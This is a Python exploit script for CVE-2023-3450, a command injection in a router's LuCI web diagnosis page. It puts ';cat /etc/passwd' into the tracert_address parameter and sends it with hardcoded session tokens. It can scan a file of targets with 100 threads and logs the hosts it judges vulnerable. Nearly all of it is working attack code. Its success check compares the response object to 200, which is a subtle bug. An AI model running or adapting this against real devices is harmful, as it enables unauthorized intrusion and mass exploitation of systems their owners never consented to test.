import requests,sys,re,argparse,time
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()

def banner():
    test="""
 _______           _______    _______  _______  _______  ______       ______     ___    _______  _______ 
(  ____ \|\     /|(  ____ \  / ___   )(  __   )/ ___   )/ ___  \     / ___  \   /   )  (  ____ \(  __   )
| (    \/| )   ( || (    \/  \/   )  || (  )  |\/   )  |\/   \  \    \/   \  \ / /) |  | (    \/| (  )  |
| |      | |   | || (__  _____   /   )| | /   |    /   )   ___) /_____  ___) // (_) (_ | (____  | | /   |
| |      ( (   ) )|  __)(_____)_/   / | (/ /) |  _/   /   (___ ((_____)(___ ((____   _)(_____ \ | (/ /) |
| |       \ \_/ / | (         /   _/  |   / | | /   _/        ) \          ) \    ) (        ) )|   / | |
| (____/\  \   /  | (____/\  (   (__/\|  (__) |(   (__/\/\___/  /    /\___/  /    | |  /\____) )|  (__) |
(_______/   \_/   (_______/  \_______/(_______)\_______/\______/     \______/     (_)  \______/ (_______)

                                                                   
"""


    print(test)



def main():
    banner()
    parser=argparse.ArgumentParser(description='CVE-2023-3450-rce')
    parser.add_argument('-u','--url',dest='url',type=str,help='input the url')
    parser.add_argument('-f','--file',dest='file',type=str,help='input the file')
    args=parser.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        url_list=[]
        with open(args.file,'r',encoding='utf-8')as fp:
            for url in fp.readlines():
                url_list.append(url.strip())
        mp=Pool(100)
        mp.map(poc,url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h")



def poc(target):
    url_payload= '/cgi-bin/luci/;stok=f039132f4ff3110277618cf485069fba/admin/diagnosis?diag=tracert&tracert_address=127.0.0.1%3Bcat+%2Fetc%2Fpasswd&seq=0 HTTP/1.1'
    headers={
        'Connection':'keep-alive',
        'X-Requested-With':'XMLHttpRequest',
        'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36',
        'Accept-Encoding':'gzip, deflate',
        'Cookie':'sysauth=47a4d3e3eaaa553c8a275dd8ac2abe2f'
    }

    try:
        res1=requests.get(url=target+url_payload,headers=headers,timeout=10)
        if res1==200 and 'root' in res1.text:
            print( f"[+]{target} 存在漏洞！")
            with open('result.txt','a',encoding='utf-8')as fp:
                fp.write(target+'\n')
                return True
        else:
            print('[-] 不存在漏洞')
            return False
    except:
        print('目标网站存在问题，无法访问')


if __name__ =='__main__':
    main()
